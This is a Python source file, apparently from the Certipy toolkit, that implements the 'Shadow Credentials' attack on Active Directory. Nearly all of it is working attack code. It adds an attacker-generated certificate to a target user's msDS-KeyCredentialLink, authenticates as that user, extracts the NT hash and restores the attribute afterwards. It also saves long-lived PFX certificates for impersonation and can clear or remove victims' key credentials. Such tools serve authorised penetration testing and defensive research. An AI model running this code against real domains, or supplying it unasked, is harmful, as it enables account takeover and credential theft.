"""
Shadow Authentication Module for Certipy.

This module provides functionality for manipulating Key Credentials in Active Directory:
- Adding new Key Credentials to user accounts
- Retrieving NT hash using Key Credential authentication
- Listing, removing, and clearing Key Credentials
- Getting detailed information about specific Key Credentials

The Key Credential technique (also known as "Shadow Credentials") allows an attacker
with write access to a user's msDS-KeyCredentialLink attribute to authenticate as
that user by adding a certificate-based credential.

References:
- https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
"""

import argparse
from typing import List, Optional, Tuple, Union

import ldap3
import OpenSSL
from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.DateTime import DateTime
from dsinternals.system.Guid import Guid

from certipy.lib.certificate import create_pfx, der_to_cert, der_to_key, x509
from certipy.lib.files import try_to_save_file
from certipy.lib.ldap import LDAPConnection, LDAPEntry
from certipy.lib.logger import is_verbose, logging
from certipy.lib.target import Target

from .auth import Authenticate


class Shadow:
    """
    Shadow Authentication class for manipulating Key Credentials in Active Directory.

    This class enables various operations related to Key Credentials including:
    - Auto mode: Add Key Credential, authenticate, retrieve NT hash, then restore original state
    - Add: Add a new Key Credential to a user account
    - List: Show all Key Credentials for a user
    - Clear: Remove all Key Credentials from a user
    - Remove: Delete a specific Key Credential identified by its Device ID
    - Info: Show detailed information about a specific Key Credential
    """

    def __init__(
        self,
        target: Target,
        account: str,
        device_id: Optional[str] = None,
        out: Optional[str] = None,
        connection: Optional[LDAPConnection] = None,
        **kwargs,  # type: ignore
    ):
        """
        Initialize the Shadow Authentication module.

        Args:
            target: Target information including domain, username, and authentication details
            account: Account to target for Key Credential operations
            device_id: Device ID for operations that require targeting a specific Key Credential
            out: Output file path for saving PFX files
            scheme: LDAP connection scheme (ldap or ldaps)
            connection: Optional existing LDAP connection
            kwargs: Additional arguments
        """
        self.target = target
        self.account = account
        self.device_id = device_id
        self.out = out
        self.kwargs = kwargs

        self._connection = connection

    @property
    def connection(self) -> LDAPConnection:
        """
        Get or establish an LDAP connection to the domain.

        Returns:
            Active LDAP connection

        Raises:
            Exception: If connection fails
        """
        if self._connection is not None:
            return self._connection

        self._connection = LDAPConnection(self.target)
        self._connection.connect()

        return self._connection

    def get_key_credentials(
        self, target_dn: str, user: LDAPEntry
    ) -> Optional[List[bytes]]:
        """
        Retrieve the current Key Credentials for a user.

        Args:
            target_dn: Distinguished name of the target user
            user: LDAP user entry

        Returns:
            List of Key Credential binary values or None on failure
        """
        results = self.connection.search(
            search_base=target_dn,
            search_filter="(objectClass=*)",
            search_scope=ldap3.BASE,
            attributes=["SAMAccountName", "objectSid", "msDS-KeyCredentialLink"],
        )

        if len(results) == 0:
            logging.error(
                f"Could not get the Key Credentials for {user.get('sAMAccountName')!r}"
            )
            return None

        result = results[0]
        return result.get("msDS-KeyCredentialLink")

    def set_key_credentials(
        self, target_dn: str, user: LDAPEntry, key_credential: List[Union[bytes, str]]
    ) -> bool:
        """
        Set new Key Credentials for a user.

        Args:
            target_dn: Distinguished name of the target user
            user: LDAP user entry
            key_credential: List of Key Credential binary values to set

        Returns:
            True on success, False on failure
        """
        result = self.connection.modify(
            target_dn,
            {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, key_credential]},
        )

        if result["result"] == 0:
            return True

        # Handle specific error cases with helpful messages
        if result["result"] == 50:
            logging.error(
                f"Could not update Key Credentials for {user.get('sAMAccountName')!r} "
                f"due to insufficient access rights: {result['message']}"
            )
        elif result["result"] == 19:
            logging.error(
                f"Could not update Key Credentials for {user.get('sAMAccountName')!r} "
                f"due to a constraint violation: {result['message']}"
            )
        else:
            logging.error(
                f"Failed to update the Key Credentials for {user.get('sAMAccountName')!r}: "
                f"{result['message']}"
            )
        return False

    def generate_key_credential(
        self, target_dn: str, subject: str
    ) -> Tuple[X509Certificate2, KeyCredential, str]:
        """
        Generate a new certificate and Key Credential object.

        Args:
            target_dn: Distinguished name of the target user
            subject: Certificate subject name

        Returns:
            Tuple containing (certificate, key_credential, device_id)
        """
        logging.info("Generating certificate")

        # Ensure subject is not too long for AD
        if len(subject) >= 64:
            logging.warning("Subject too long. Limiting subject to 64 characters.")
            subject = subject[:64]

        # Generate a certificate valid for a long time (-40 to +40 years)
        cert = X509Certificate2(
            subject=subject,
            keySize=2048,
            notBefore=(-40 * 365),
            notAfter=(40 * 365),
        )
        logging.info("Certificate generated")

        # Create a Key Credential from the certificate
        logging.info("Generating Key Credential")
        key_credential = KeyCredential.fromX509Certificate2(
            certificate=cert,
            deviceId=Guid(),  # Generate a random device ID
            owner=target_dn,
            currentTime=DateTime(),
        )

        device_id = key_credential.DeviceId.toFormatD()
        logging.info(f"Key Credential generated with DeviceID {device_id!r}")

        return (cert, key_credential, device_id)

    def add_new_key_credential(
        self, target_dn: str, user: LDAPEntry
    ) -> Optional[Tuple[X509Certificate2, List[Union[bytes, str]], List[bytes], str]]:
        """
        Add a new Key Credential to a user.

        Args:
            target_dn: Distinguished name of the target user
            user: LDAP user entry

        Returns:
            Tuple containing (certificate, new_key_credential_list,
                             saved_key_credential_list, device_id) or None on failure
        """
        # Generate a new Key Credential
        sam_account_name = self._get_sam_account_name(user)
        cert, key_credential, device_id = self.generate_key_credential(
            target_dn, sam_account_name
        )

        # Show detailed info in verbose mode
        if is_verbose():
            key_credential.fromDNWithBinary(key_credential.toDNWithBinary()).show()

        # Get the existing Key Credentials
        saved_key_credential = self.get_key_credentials(target_dn, user)
        if saved_key_credential is None:
            saved_key_credential = []

        # Create a new list including our new Key Credential
        new_key_credential = saved_key_credential + [
            key_credential.toDNWithBinary().toString()
        ]

        logging.info(
            f"Adding Key Credential with device ID {device_id!r} to the Key Credentials for "
            f"{user.get('sAMAccountName')!r}"
        )

        # Update the user's Key Credentials
        result = self.set_key_credentials(target_dn, user, new_key_credential)
        if result is False:
            return None

        logging.info(
            f"Successfully added Key Credential with device ID {device_id!r} to the Key Credentials for "
            f"{user.get('sAMAccountName')!r}"
        )

        return (cert, new_key_credential, saved_key_credential, device_id)

    def get_key_and_certificate(
        self, cert2: X509Certificate2
    ) -> Tuple[PrivateKeyTypes, x509.Certificate]:
        """
        Extract the private key and certificate from an X509Certificate2 object.

        Args:
            cert2: X509Certificate2 object

        Returns:
            Tuple containing (private_key, certificate)
        """
        # Extract and convert the private key
        key = der_to_key(
            OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_ASN1, cert2.key)  # type: ignore
        )

        # Extract and convert the certificate
        cert = der_to_cert(
            OpenSSL.crypto.dump_certificate(
                OpenSSL.crypto.FILETYPE_ASN1, cert2.certificate
            )
        )

        return (key, cert)

    def _get_target_dn(self, user: LDAPEntry) -> Optional[str]:
        """
        Get the distinguished name from a user entry and validate it.

        Args:
            user: LDAP user entry

        Returns:
            Distinguished name string or None if invalid
        """
        target_dn = user.get("distinguishedName")

        if not isinstance(target_dn, str):
            logging.error(
                "Target DN is not a string. Cannot proceed with the operation."
            )
            return None

        return target_dn

    def _get_sam_account_name(self, user: LDAPEntry) -> str:
        """
        Get the SAM account name from a user entry.

        Args:
            user: LDAP user entry

        Returns:
            SAM account name string
        """
        sam_account_name = user.get("sAMAccountName")

        if not isinstance(sam_account_name, str):
            logging.warning(
                "SAM account name is not a string. Falling back to the account name."
            )
            return self.account

        return sam_account_name

    def auto(self) -> Optional[str]:
        """
        Automatically add a Key Credential, authenticate, get NT hash, and restore original state.

        This is the most common attack scenario - adding a temporary Key Credential,
        using it to authenticate and get the NT hash, then cleaning up by restoring
        the original Key Credentials.

        Returns:
            NT hash string on success, False on failure
        """
        # Get the target user
        user = self.connection.get_user(self.account)
        if user is None:
            return None

        sam_account_name = self._get_sam_account_name(user)

        logging.info(f"Targeting user {sam_account_name!r}")

        # Get and validate the distinguished name
        target_dn = self._get_target_dn(user)
        if not target_dn:
            return None

        # Add a new Key Credential
        result = self.add_new_key_credential(target_dn, user)
        if result is None:
            return None

        # Unpack the result
        cert, _, saved_key_credential, _ = result

        # Extract the key and certificate for authentication
        key, cert = self.get_key_and_certificate(cert)

        # Authenticate with the new Key Credential
        sam_account_name = self._get_sam_account_name(user)

        logging.info(f"Authenticating as {sam_account_name!r} with the certificate")
        authenticate = Authenticate(self.target, cert=cert, key=key)
        _ = authenticate.authenticate(
            username=sam_account_name,
            is_key_credential=True,
            domain=self.connection.domain,
        )

        # Cleanup by restoring the original Key Credentials
        logging.info(f"Restoring the old Key Credentials for {sam_account_name!r}")
        result = self.set_key_credentials(target_dn, user, saved_key_credential)  # type: ignore

        if result is True:
            logging.info(
                f"Successfully restored the old Key Credentials for {sam_account_name!r}"
            )

        # Return the obtained NT hash
        logging.info(f"NT hash for {sam_account_name!r}: {authenticate.nt_hash}")
        return authenticate.nt_hash

    def add(self) -> bool:
        """
        Add a new Key Credential to a user and save the certificate as a PFX file.

        Returns:
            True on success, False on failure
        """
        # Get the target user
        user = self.connection.get_user(self.account)
        if user is None:
            return False

        sam_account_name = self._get_sam_account_name(user)

        logging.info(f"Targeting user {sam_account_name!r}")

        # Get and validate the distinguished name
        target_dn = self._get_target_dn(user)
        if not target_dn:
            return False

        # Add a new Key Credential
        result = self.add_new_key_credential(target_dn, user)
        if result is None:
            return False

        # Unpack the result
        cert, _, _, _ = result

        # Extract the key and certificate
        key, cert = self.get_key_and_certificate(cert)

        # Determine output filename
        out = self.out
        if out is None:
            sam_account_name = self._get_sam_account_name(user)
            out = f"{sam_account_name.rstrip('$')}.pfx"

        # Create and save PFX
        pfx = create_pfx(key, cert)

        logging.info(f"Saving certificate and private key to {out!r}")
        out = try_to_save_file(
            pfx,
            out,
        )
        logging.info(f"Saved certificate and private key to {out!r}")

        return True

    def list(self) -> bool:
        """
        List all Key Credentials for a user.

        Returns:
            True if Key Credentials were found and listed, False otherwise
        """
        # Get the target user
        user = self.connection.get_user(self.account)
        if user is None:
            return False

        sam_account_name = self._get_sam_account_name(user)

        logging.info(f"Targeting user {sam_account_name!r}")

        # Get and validate the distinguished name
        target_dn = self._get_target_dn(user)
        if not target_dn:
            return False

        # Get the Key Credentials
        key_credentials = self.get_key_credentials(target_dn, user)
        if key_credentials is None:
            return False

        # Handle empty Key Credentials
        if len(key_credentials) == 0:
            logging.info(
                f"The Key Credentials attribute for {sam_account_name!r} "
                f"is either empty or the current user does not have read permissions for the attribute"
            )
            return False

        # List the Key Credentials
        logging.info(f"Listing Key Credentials for {sam_account_name!r}")
        for dn_binary_value in key_credentials:
            key_credential = KeyCredential.fromDNWithBinary(
                DNWithBinary.fromRawDNWithBinary(dn_binary_value)
            )

            logging.info(
                f"DeviceID: {key_credential.DeviceId.toFormatD()} | "
                f"Creation Time (UTC): {key_credential.CreationTime}"
            )

        return True

    def clear(self) -> bool:
        """
        Clear all Key Credentials for a user.

        Returns:
            True on success, False on failure
        """
        # Get the target user
        user = self.connection.get_user(self.account)
        if user is None:
            return False

        sam_account_name = self._get_sam_account_name(user)

        logging.info(f"Targeting user {sam_account_name!r}")

        # Get and validate the distinguished name
        target_dn = self._get_target_dn(user)
        if not target_dn:
            return False

        # Clear the Key Credentials
        logging.info(f"Clearing the Key Credentials for {sam_account_name!r}")
        result = self.set_key_credentials(target_dn, user, [])

        if result is True:
            logging.info(
                f"Successfully cleared the Key Credentials for {sam_account_name!r}"
            )

        return result

    def remove(self) -> bool:
        """
        Remove a specific Key Credential identified by its Device ID.

        Returns:
            True on success, False on failure
        """
        # Ensure a device ID was provided
        if self.device_id is None:
            logging.error(
                "A device ID (-device-id) is required for the remove operation"
            )
            return False

        # Get the target user
        user = self.connection.get_user(self.account)
        if user is None:
            return False

        sam_account_name = self._get_sam_account_name(user)

        logging.info(f"Targeting user {sam_account_name!r}")

        # Get and validate the distinguished name
        target_dn = self._get_target_dn(user)
        if not target_dn:
            return False

        # Get the Key Credentials
        key_credentials = self.get_key_credentials(target_dn, user)
        if key_credentials is None:
            return False

        # Handle empty Key Credentials
        if len(key_credentials) == 0:
            logging.info(
                f"The Key Credentials attribute for {sam_account_name!r} "
                f"is either empty or the current user does not have read permissions for the attribute"
            )
            return True

        # Find and remove the specified Key Credential
        device_id = self.device_id
        new_key_credentials = []
        device_id_in_current_values = False

        for dn_binary_value in key_credentials:
            key_credential = KeyCredential.fromDNWithBinary(
                DNWithBinary.fromRawDNWithBinary(dn_binary_value)
            )
            if key_credential.DeviceId.toFormatD() == device_id:
                logging.info(
                    f"Found device ID {device_id!r} in Key Credentials {sam_account_name!r}"
                )
                device_id_in_current_values = True
            else:
                new_key_credentials.append(dn_binary_value)

        # Update the Key Credentials if the specified Device ID was found
        if device_id_in_current_values:
            logging.info(
                f"Deleting the Key Credential with device ID {device_id!r} "
                f"in Key Credentials for {sam_account_name!r}"
            )

            result = self.set_key_credentials(target_dn, user, new_key_credentials)

            if result is True:
                logging.info(
                    f"Successfully deleted the Key Credential with device ID {device_id!r} "
                    f"in Key Credentials for {sam_account_name!r}"
                )
            return result
        else:
            logging.error(
                f"Could not find device ID {device_id!r} in Key Credentials for "
                f"{sam_account_name!r}"
            )
            return False

    def info(self) -> bool:
        """
        Show detailed information about a specific Key Credential.

        Returns:
            True if the Key Credential was found and info displayed, False otherwise
        """
        # Ensure a device ID was provided
        if self.device_id is None:
            logging.error("A device ID (-device-id) is required for the info operation")
            return False

        # Get the target user
        user = self.connection.get_user(self.account)
        if user is None:
            return False

        sam_account_name = self._get_sam_account_name(user)

        logging.info(f"Targeting user {sam_account_name!r}")

        # Get and validate the distinguished name
        target_dn = self._get_target_dn(user)
        if not target_dn:
            return False

        # Get the Key Credentials
        key_credentials = self.get_key_credentials(target_dn, user)
        if key_credentials is None:
            return False

        # Handle empty Key Credentials
        if len(key_credentials) == 0:
            logging.info(
                f"The Key Credentials attribute for {sam_account_name!r} "
                f"is either empty or the current user does not have read permissions for the attribute"
            )
            return True

        # Find the specified Key Credential and display its info
        device_id = self.device_id
        for dn_binary_value in key_credentials:
            key_credential = KeyCredential.fromDNWithBinary(
                DNWithBinary.fromRawDNWithBinary(dn_binary_value)
            )
            if key_credential.DeviceId.toFormatD() == device_id:
                logging.info(
                    f"Found device ID {device_id!r} in Key Credentials {sam_account_name!r}"
                )
                key_credential.show()
                return True

        logging.error(
            f"Could not find device ID {device_id!r} in Key Credentials for "
            f"{sam_account_name!r}"
        )

        return False


def entry(options: argparse.Namespace) -> None:
    """
    Command-line entry point for Shadow Authentication operations.

    Args:
        options: Command-line arguments
    """
    # Create target from options
    target = Target.from_options(options)

    # Use provided account or default to the authenticated username
    account = options.account
    if account is None:
        account = target.username

    if account is None:
        logging.error("An account (-account) is required")
        return

    # Remove processed options
    options.__delattr__("account")
    options.__delattr__("target")

    # Create Shadow instance
    shadow = Shadow(target=target, account=account, **vars(options))

    # Map actions to methods
    actions = {
        "auto": shadow.auto,  # Add Key Credential, authenticate, get NT hash, restore
        "add": shadow.add,  # Add Key Credential and save PFX
        "list": shadow.list,  # List all Key Credentials
        "clear": shadow.clear,  # Remove all Key Credentials
        "remove": shadow.remove,  # Remove specific Key Credential
        "info": shadow.info,  # Show info about specific Key Credential
    }

    # Execute the requested action
    actions[options.shadow_action]()
